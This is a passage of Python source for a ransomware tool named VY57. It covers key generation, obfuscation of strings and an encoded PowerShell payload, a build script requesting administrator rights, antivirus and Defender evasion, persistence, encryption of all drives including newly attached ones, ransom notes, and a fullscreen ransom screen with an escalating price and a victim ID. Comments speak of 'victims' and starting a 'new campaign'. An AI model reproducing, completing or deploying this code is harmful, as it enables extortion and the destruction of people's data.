        ('ADDRESS', ADDRESS[::-1]), ('NOTE_NAME', NOTE_NAME[::-1]),
        ('NOTE_HTML', NOTE_HTML[::-1]), ('WALL_NAME', WALL_NAME[::-1]),
        ('SUFFIX', SUFFIX), ('DEFAULT_EXT', DEFAULT_EXT), ('CLSID', CLSID),
        ('EXCL_KEY', EXCL_KEY), ('POLICY_DEF', POLICY_DEF),
        ('RP_SUB', RP_SUB), ('SIG_SUB', SIG_SUB), ('RUN_KEY', RUN_KEY),
        ('PERSIST_NAME', PERSIST_NAME), ('PERSIST_SUB', PERSIST_SUB),
        ('PS_EXEC_POLICY', PS_EXEC_POLICY), ('PS_SCRIPT_LOG', PS_SCRIPT_LOG),
    )
    lines = []
    for name, text in table:
        tail = ' [::-1]' if name in reverse else ''
        lines.append(f'{name} = _s({_hexlit(text)}){tail}')
    lines.append('')
    lines.append(f'PERSIST_EXE_NAME = PERSIST_NAME + _s({_hexlit(".exe")})')
    lines.append(f'LNK_NAME = PERSIST_NAME + _s({_hexlit(".lnk")})')
    head = _hexlit('Software\\Classes\\CLSID\\')
    tail = _hexlit('\\InprocServer32')
    lines.append(f'KEY_REG = (_s({head}) + CLSID +')
    lines.append(f'           _s({tail}))')
    lines.append('POLICY_RP = POLICY_DEF + RP_SUB')
    lines.append('POLICY_SIG = POLICY_DEF + SIG_SUB')
    return '\n'.join(lines)


def psblob_body() -> str:
    blob = base64.b64encode(
        bytes(b ^ PS_XOR for b in PS_PLAIN.encode('utf-8'))).decode()
    lines = ['PS_BLOB = (']
    for i in range(0, len(blob), 66):
        lines.append(f'    {blob[i:i + 66]!r}')
    lines.append(')')
    return '\n'.join(lines)


def _patch(src: str, name: str, body: str) -> str:
    begin = f'# ==== VY57:AUTO:BEGIN {name} ===='
    end = f'# ==== VY57:AUTO:END {name} ===='
    i = src.find(begin)
    j = src.find(end)
    if i < 0 or j < 0 or j < i:
        raise SystemExit(f'AUTO markers for "{name}" missing or out of order')
    return f'{src[:i + len(begin)]}\n{body.strip()}\n{src[j:]}'


def gen_ps() -> None:
    print(f'PS_XOR = {hex(PS_XOR)}')
    print(psblob_body())
    print('\nPaste into the psblob region, then rebuild.')


def gen_key() -> None:
    print(f'KEY_XOR = {hex(KEY_XOR)}')
    print('Paste over KEY_XOR, then rebuild.')


def gen_lits() -> None:
    print(lits_body())
    print('\nPaste over the lits region, then rebuild.')


def gen_keys() -> None:
    if IS_FROZEN:
        die('run --gen-keys from the .py source, not the built exe')
    key = RSA.generate(2048)
    with open(os.path.join(BASE, 'vy57_priv.pem'), 'wb') as fh:
        fh.write(key.export_key('PEM'))
    pub = base64.b64encode(key.publickey().export_key('DER')).decode()
    print('Private key written to vy57_priv.pem — KEEP IT OFF THE VICTIM.')
    print('PUB_B64 = (')
    print(_wrap_pem(pub))
    print(')')


# ---------------------------------------------------------------- assets

def make_ico(path: str) -> None:
    sizes = (16, 24, 32, 48, 64, 128, 256)
    images = []
    for s in sizes:
        b = max(1, s // 16)
        lo, hi = int(s * 0.28), int(s * 0.72)
        cx0 = s // 2 - max(1, s // 18)
        cx1 = s // 2 + max(1, s // 18)
        px = [[(18, 10, 10, 255)] * s for _ in range(s)]
        for y in range(s):
            for x in range(s):
                if x < b or y < b or x >= s - b or y >= s - b:
                    px[y][x] = (30, 30, 190, 255)
                elif lo <= x < hi and lo <= y < hi:
                    px[y][x] = (200, 40, 40, 255)
        for y in range(lo + b, hi - b):
            for x in range(cx0, cx1):
                px[y][x] = (18, 10, 10, 255)
        rows = []
        for y in range(s - 1, -1, -1):
            row = bytearray()
            for x in range(s):
                bl, g, r, a = px[y][x]
                row += bytes((bl, g, r, a))
            rows.append(bytes(row))
        xor = b''.join(rows)
        and_row = ((s + 31) // 32) * 4
        and_mask = b'\x00' * (and_row * s)
        dib = struct.pack('<IiiHHIIiiII', 40, s, s * 2, 1, 32, 0,
                          len(xor), 0, 0, 0, 0)
        images.append(dib + xor + and_mask)

    out = struct.pack('<HHH', 0, 1, len(images))
    offset = 6 + 16 * len(images)
    entries = b''
    for s, img in zip(sizes, images):
        entries += struct.pack('<BBBBHHII', s % 256, s % 256, 0, 0, 1, 32,
                               len(img), offset)
        offset += len(img)
    with open(path, 'wb') as fh:
        fh.write(out + entries + b''.join(images))


def make_wall(path: str, w: int = 1920, h: int = 1080) -> None:
    pad = (-w * 3) % 4
    dark = bytes([10, 5, 5]) * w + b'\x00' * pad
    red = bytes([30, 30, 190]) * w + b'\x00' * pad
    rows = [red if (y < 12 or y >= h - 12 or 512 <= y < 552) else dark
            for y in range(h)]
    data = b''.join(rows)
    size = 54 + len(data)
    header = (b'BM' + struct.pack('<IHHI', size, 0, 0, 54) +
              struct.pack('<IiiHHIIiiII', 40, w, h, 1, 24, 0, len(data),
                          2835, 2835, 0, 0))
    with open(path, 'wb') as fh:
        fh.write(header + data)


BUILD_BAT = r"""@echo off
setlocal
cd /d "%~dp0"
if not exist vy57.py ( echo missing vy57.py & pause & exit /b 1 )
if not exist app.ico ( echo missing app.ico - run setup again & pause & exit /b 1 )
if not exist wall.bmp ( echo missing wall.bmp - run setup again & pause & exit /b 1 )
if not exist vy57_priv.pem echo WARNING: no vy57_priv.pem here, unlockers will need --key

python -m nuitka --standalone --mingw64 ^
  --enable-plugin=tk-inter --windows-console-mode=force ^
  --windows-uac-admin ^
  --windows-icon-from-ico=app.ico ^
  --include-data-file=wall.bmp=wall.bmp ^
  --python-flag=no_site,no_asserts,no_docstrings ^
  --include-package=Crypto --assume-yes-for-downloads ^
  --output-filename=__NAME__ vy57.py %*

set RC=%ERRORLEVEL%
if not "%RC%"=="0" (
  echo.
  echo BUILD FAILED - nuitka exit %RC%
  pause
  exit /b 1
)

echo.
echo built %~dp0vy57.dist\__NAME__
pause
"""


def setup(new_keys: bool) -> None:
    if IS_FROZEN:
        die('run --setup from the .py source, not the built exe')

    path = os.path.abspath(__file__)
    with open(path, 'r', encoding='utf-8') as fh:
        src = fh.read()

    for name in ('xor', 'keys', 'lits', 'psblob'):
        if f'VY57:AUTO:BEGIN {name}' not in src:
            die(f'AUTO marker "{name}" missing from {path}')

    pem_path = os.path.join(BASE, 'vy57_priv.pem')
    if new_keys or not os.path.isfile(pem_path):
        key = RSA.generate(2048)
        with open(pem_path, 'wb') as fh:
            fh.write(key.export_key('PEM'))
        print(f'[+] new keypair        {pem_path}')
    else:
        try:
            with open(pem_path, 'rb') as fh:
                key = RSA.import_key(fh.read())
        except (OSError, ValueError) as exc:
            die(f'[!] vy57_priv.pem unreadable ({exc}) - rerun with --new-keys')
        print(f'[=] reusing keypair    {pem_path}')

    backups = os.path.join(BASE, 'keys')
    try:
        os.makedirs(backups, exist_ok=True)
        stamp = time.strftime('%Y%m%d-%H%M%S')
        with open(os.path.join(backups, f'vy57_priv_{stamp}.pem'), 'wb') as fh:
            fh.write(key.export_key('PEM'))
        print(f'[+] key backed up      {backups}')
    except OSError as exc:
        print(f'[!] key backup failed  {exc}')

    pub = base64.b64encode(key.publickey().export_key('DER')).decode()
    fingerprint = hashlib.sha256(pub.encode()).hexdigest()[:16]

    global KEY_XOR, PS_XOR
    KEY_XOR = secrets.randbelow(254) + 1
    PS_XOR = secrets.randbelow(254) + 1
    print(f'[+] PS_XOR=0x{PS_XOR:02X}  KEY_XOR=0x{KEY_XOR:02X}')

    src = _patch(src, 'xor',
                 f'PS_XOR = 0x{PS_XOR:02X}\nKEY_XOR = 0x{KEY_XOR:02X}')
    src = _patch(src, 'keys', f'PUB_B64 = (\n{_wrap_pem(pub)}\n)')
    src = _patch(src, 'lits', lits_body())
    src = _patch(src, 'psblob', psblob_body())

    try:
        compile(src, path, 'exec')
    except SyntaxError as exc:
        die(f'[!] patched source does not compile: {exc}')

    if not os.path.isfile(os.path.join(BASE, 'app.ico')):
        make_ico(os.path.join(BASE, 'app.ico'))
        print('[+] app.ico generated')
    else:
        print('[=] app.ico kept')

    if not os.path.isfile(os.path.join(BASE, 'wall.bmp')):
        make_wall(os.path.join(BASE, 'wall.bmp'))
        print('[+] wall.bmp generated')
    else:
        print('[=] wall.bmp kept')

    bat = os.path.join(BASE, 'build.bat')
    try:
        with open(bat, 'w', encoding='utf-8', newline='\r\n') as fh:
            fh.write(BUILD_BAT.replace('__NAME__', BUILD_NAME))
        print('[+] build.bat written')
    except OSError as exc:
        die(f'[!] could not write build.bat: {exc}')

    tmp = path + '.tmp'
    with open(tmp, 'w', encoding='utf-8', newline='') as fh:
        fh.write(src)
    os.replace(tmp, path)
    print(f'[+] source patched     {path}')

    print()
    print('-' * 60)
    print(f'  key fingerprint : {fingerprint}')
    print(f'  version         : {VERSION}')
    print(f'  output name     : {BUILD_NAME}')
    print('-' * 60)
    print()
    print('NEXT')
    print('  1. run build.bat')
    print('  2. copy vy57_priv.pem somewhere safe')
    print(f'  3. test with:  .\\vy57.dist\\{BUILD_NAME} --list')
    print(f'  4. test with:  .\\vy57.dist\\{BUILD_NAME} --scope user '
          '--workers 2 --no-persist')
    print()
    print('Re-running --setup rotates the XOR constants and literals but keeps')
    print('the keypair, so existing victims stay decryptable. Use --new-keys')
    print('only when starting a new campaign.')


# ---------------------------------------------------------------- GUI

def gui(key_text: str, total: int, roots: list, payload: dict,
        counter: dict) -> bool:
    unlocked = {'value': False}
    started = time.time()

    def beep(kind=0x10):
        try:
            if winsound:
                winsound.MessageBeep(kind)
        except Exception:
            pass

    window = Tk()
    window.title(f'!!! VY57 / {payload.get("i", VID)} !!!')
    window.attributes('-fullscreen', True)
    window.attributes('-topmost', True)
    window.config(bg='black')
    window.lift()
    try:
        window.focus_force()
    except Exception:
        pass

    root_frame = Frame(window, bg='black', width=1100, height=700)
    root_frame.place(relx=0.5, rely=0.5, anchor='center')

    def attempt(_event=None):
        if unlocked['value']:
            return
        if hmac.compare_digest(entry.get().strip(), key_text):
            status.config(text='KEY ACCEPTED - DECRYPTING...', fg='lime')
            unlocked['value'] = True
            entry.config(state='disabled')
            window.after(200, window.destroy)
        else:
            status.config(text='WRONG KEY !!!', fg='red')
            entry.select_range(0, 'end')
            entry.focus_set()
            beep(0x10)

    Label(root_frame, text='YOUR COMPUTER HAS BEEN LOCKED BY VY57',
          font=Font(window, size=30, weight=BOLD),
          fg='red', bg='black').place(x=55, y=25)

    message = ('Every file on this machine has been encrypted.\n'
               'Shadow copies, restore points and the backup catalog are gone.\n'
               f'The key is not stored in readable form. Price: '
               f'${price_now(payload)} USD.')
    Label(root_frame, text=message, fg='green', bg='black',
          font='Helvetica 15', justify='left').place(x=60, y=95)

    Label(root_frame, text=f'VICTIM ID  {payload.get("i", VID)}',
          fg='#4fc3f7', bg='black',
          font=('Courier', 17, 'bold')).place(x=60, y=190)

    Label(root_frame, text=ADDRESS,
          fg='black', bg='white',
          font='Courier 16').place(x=60, y=240)

    hint = ('After payment you receive unlock.bat and unlock.ps1.\n'
            'Run unlock.bat and wait. Or enter the key below.')
    Label(root_frame, text=hint, fg='orange', bg='black',
          font='Helvetica 13', justify='left').place(x=60, y=300)

    progress = Label(root_frame, fg='gray70', bg='black',
                     font='Helvetica 11', wraplength=640, justify='left')
    progress.place(x=60, y=360)

    Label(root_frame, text='Enter The Key:', fg='red', bg='black',
          font='Helvetica 16').place(x=60, y=400)

    entry = Entry(root_frame, width=44, bg='white', fg='black',
                  font='Courier 16')
    entry.place(x=60, y=436)
    entry.focus_set()

    Button(root_frame, text='OK', command=attempt, bg='white', fg='black',
           font='Helvetica 13', width=4).place(x=555, y=433)

    status = Label(root_frame, text='', fg='red', bg='black',
                   font='Helvetica 16')
    status.place(x=60, y=490)

    timer = Label(root_frame, text='0:00:00', fg='red', bg='black',
                  font=('Courier', 30, 'bold'))
    timer.place(x=60, y=530)

    deadline = Label(root_frame, text='', fg='#ff9800', bg='black',
                     font=('Courier', 15, 'bold'))
    deadline.place(x=60, y=600)

    lock = Canvas(root_frame, width=230, height=260, bg='black',
                  highlightthickness=0)
    lock.place(x=800, y=180)
    lock.create_arc(50, 20, 180, 150, start=0, extent=180,
                    style='arc', outline='red', width=14)
    lock.create_rectangle(35, 100, 195, 235, fill='red', outline='red')
    lock.create_oval(96, 140, 134, 178, fill='black', outline='black')
    lock.create_rectangle(108, 160, 122, 215, fill='black', outline='black')

    def tick():
        try:
            if not window.winfo_exists():
                return
        except Exception:
            return
        elapsed = int(time.time() - started)
        timer.config(text=f'{elapsed // 3600}:'
                          f'{(elapsed % 3600) // 60:02d}:{elapsed % 60:02d}')
        left = int(deadline_epoch(payload) - time.time())
        if left <= 0:
            deadline.config(text='DEADLINE PASSED - PRICE x4', fg='red')
        else:
            deadline.config(
                text=f'PRICE x{2 if left < DEADLINE_HOURS * 1800 else 1} '
                     f'IN {left // 3600}h {(left % 3600) // 60:02d}m',
                fg='#ff9800')
        done = counter.get('n', 0)
        progress.config(
            text=f'{done} of {total} file(s) locked across {len(roots)} '
                 f'root(s)' + ('  —  still running' if done < total else ''))
        timer.after(1000, tick)

    tick()
    window.bind('<Return>', attempt)
    window.protocol('WM_DELETE_WINDOW', attempt)
    beep(0x30)
    window.mainloop()

    return unlocked['value']


def run_gui(master: bytes, pending: list, roots: list,
            payload: dict) -> bool:
    try:
        return gui(key_to_text(master), len(pending), roots, payload,
                   DONE_COUNTER)
    except Exception as exc:
        log_exc('gui failed - continuing headless', exc)
        try:
            ctypes.windll.user32.MessageBoxW(
                None, f'GUI failed:\n{exc}', 'VY57', 0x10)
        except Exception:
            pass
        return False


# ---------------------------------------------------------------- main

def arg_value(flag: str):
    if flag in sys.argv:
        i = sys.argv.index(flag)
        if i + 1 < len(sys.argv):
            return sys.argv[i + 1]
    return None


def watch_drives(roots: list, master: bytes, stop: dict) -> None:
    while not stop['done']:
        for _ in range(30):
            if stop['done']:
                return
            time.sleep(1)
        with ROOTS_LOCK:
            fresh = new_drives(roots)
            roots.extend(fresh)
        if fresh:
            logline(f'new volume(s): {fresh}')
            for root in fresh:
                encrypt_all(master, [root], reset=False)


def restore_and_clean(payload: dict, roots: list, master: bytes) -> None:
    decrypt_all(master, roots)
    remove_notes(roots)
    original = payload.get('wp')
    if original and os.path.isfile(original):
        set_wallpaper(original)
        logline('wallpaper restored')
    remove_persistence()
    logline('cleanup done')


def main() -> None:
    global DEBUG_PATH, MAX_SIZE, WORKERS, EXT, VID
    os.makedirs(LOCAL_KEY_DIR, exist_ok=True)
    try:
        with open(os.path.join(LOCAL_KEY_DIR, 'started.txt'), 'a',
                  encoding='utf-8') as fh:
            fh.write(f'{time.strftime("%H:%M:%S")} {VERSION} '
                     f'frozen={IS_FROZEN} {sys.argv[1:]}\n')
    except OSError:
        pass
    DEBUG_PATH = os.path.join(LOCAL_KEY_DIR, 'vy57_debug.log')
    try:
        if os.path.getsize(DEBUG_PATH) > DEBUG_LIMIT:
            os.replace(DEBUG_PATH, DEBUG_PATH + '.1')
    except OSError:
        pass
    _ensure_stdout()

    if '--watch' in sys.argv:
        try:
            run_watchdog(int(arg_value('--watch') or 0),
                         arg_value('--origin') or '')
        except ValueError:
            pass
        return

    if '--setup' in sys.argv:
        setup('--new-keys' in sys.argv)
        return

    if '--gen-keys' in sys.argv:
        gen_keys()
        return
    if '--gen-ps' in sys.argv:
        gen_ps()
        return
    if '--gen-key' in sys.argv:
        gen_key()
        return
    if '--gen-lits' in sys.argv:
        gen_lits()
        return
    if '--make-unlocker' in sys.argv:
        make_unlocker()
        return

    evade = '--no-evade' not in sys.argv
    delay = evade and '--no-delay' not in sys.argv
    quiet = '--quiet' in sys.argv

    logline('-' * 50)
    logline(f'vy57 {VERSION} base={BASE} frozen={IS_FROZEN}')
    logline(f'admin={is_admin()} vm={in_vm()} evade={evade} quiet={quiet} '
            f'pub={bool(PUB_B64)}')

    if arg_value('--max-size') is not None:
        MAX_SIZE = int(arg_value('--max-size')) * 1024 * 1024
    if arg_value('--workers') is not None:
        WORKERS = max(1, min(32, int(arg_value('--workers'))))

    if IS_FROZEN:
        strip_zone(original_exe())

    if elevate():
        return

    scope = arg_value('--scope') or 'all'
    roots = discover_roots(scope)
    logline(f'scope={scope} roots={roots} workers={WORKERS}')

    if '--list' in sys.argv:
        count_per_root(roots)
        return

    if '--decrypt' in sys.argv:
        given = arg_value('--key')
        payload = read_store()
        try:
            if given:
                master = text_to_key(given)
            elif payload:
                master = master_of(payload)
            else:
                die('no stored key - pass --key or --priv')
                return
        except SystemExit:
            raise
        except Exception as exc:
            die(f'cannot obtain master: {exc}')
            return
        if payload:
            EXT = payload.get('e') or EXT
            roots = payload.get('r') or roots
        restore_and_clean(payload or {}, roots, master)
        return

    if not single_instance():
        logline('another instance is running - exiting')
        return

    payload = read_store()
    master = None
    if payload:
        EXT = payload.get('e') or EXT
        VID = payload.get('i', VID)
        roots = payload.get('r') or roots
        try:
            master = master_of(payload)
            logline(f'existing infection ({VID}) - reusing key')
            write_store(payload)
        except Exception as exc:
            log_exc('stored key unusable - starting a fresh infection', exc)
            payload = None

    if payload is None:
        VID = new_vid()
        EXT = f'.{VID}{SUFFIX}'
        SKIP_EXTENSIONS.add(EXT)
        master = new_master()
        payload = {'w': wrap_master(master), 'i': VID, 'e': EXT,
                   'r': roots, 'wp': get_wallpaper(), 't': int(time.time())}
        try:
            payload['d'] = base64.b64encode(dpapi_protect(master)).decode()
        except Exception as exc:
            log_exc('dpapi protect failed', exc)
        write_store(payload)
        logline(f'new infection {VID} ext={EXT}')

    if delay:
        logline('phase: delay')
        jitter()

    if evade:
        for product in av_products():
            logline(f'third-party av: {product}')
        logline('phase: defender')
        harden_defender(roots)
        time.sleep(random.uniform(1.0, 3.0))

    if '--no-harden' not in sys.argv:
        logline('phase: hardening')
        harden(roots)
        time.sleep(random.uniform(0.5, 2.0))
    if '--no-kill' not in sys.argv:
        kill_holders()

    if '--no-persist' not in sys.argv:
        logline('phase: persistence')
        install_persistence()
        add_exclusions([PERSIST_DIR])

    logline('phase: listing')
    pending = list_plain(roots)
    logline(f'{len(pending)} file(s) queued')

    if not pending and quiet:
        logline('quiet: nothing to do')
        return

    paint_wallpaper()
    logline('phase: notes')
    dropped = drop_notes(roots, payload, len(pending))
    html_notes = [d for d in dropped if d.endswith(NOTE_HTML)]
    if html_notes and '--no-open' not in sys.argv:
        try:
            os.startfile(html_notes[0])
        except Exception:
            pass
    try:
        if winsound:
            winsound.MessageBeep(0x30)
    except Exception:
        pass

    stop = {'done': False}
    watcher = threading.Thread(target=watch_drives,
                               args=(roots, master, stop), daemon=True)
    watcher.start()

    def finish():
        try:
            os.makedirs(KEY_DIR, exist_ok=True)
            open(DONE_MARK, 'w').close()
        except OSError:
            pass

    if quiet:
        logline('phase: encrypt')
        encrypt_all(master, roots, pending, delay)
        stop['done'] = True
        finish()
        logline('phase: gui')
        unlocked = run_gui(master, pending, roots, payload)
    else:
        spawn_watchdog()

        def run():
            logline('phase: encrypt')
            encrypt_all(master, roots, pending, delay)
            stop['done'] = True
            finish()

        worker = threading.Thread(target=run)
        worker.start()
        logline('phase: gui')
        unlocked = run_gui(master, pending, roots, payload)
        worker.join()
        stop['done'] = True

    if unlocked:
        restore_and_clean(payload, roots, master)
    else:
        logline('locked - victim needs unlock.bat after payment')


if __name__ == '__main__':
    try:
        main()
    except SystemExit:
        pass
    except Exception:
        if DEBUG_PATH:
            try:
                with open(DEBUG_PATH, 'a', encoding='utf-8') as fh:
                    fh.write(traceback.format_exc() + '\n')
            except OSError:
                pass
        else:
            _boot_fail()
        raise